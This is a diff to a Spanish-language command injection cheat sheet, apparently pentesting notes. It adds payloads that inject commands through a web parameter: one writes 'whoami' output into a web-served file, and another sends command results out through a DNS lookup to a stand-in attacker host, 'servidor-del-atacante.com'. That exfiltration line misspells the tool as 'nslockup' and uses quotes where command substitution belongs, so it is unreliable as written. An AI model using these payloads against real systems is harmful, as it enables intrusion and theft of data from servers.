@@ -72,4 +72,8 @@ parametro= x||ping+-c+10+127.0.0.1||
 Redirecting Output:
 Podemos también crear archivos internos con la información de los comandos, de esta manera podremos luego visitar el archivo
 creado y consultar el resultado:
-& whoami > /var/www/static/whoami.txt &
+parametro = || whoami > /var/www/static/whoami.txt ||
+
+Out-of-band exfiltration:
+x || nslockup 'whoami'.servidor-del-atacante.com ||
+Nos llegara una request a un subdominio con los datos del comando ejecutado.
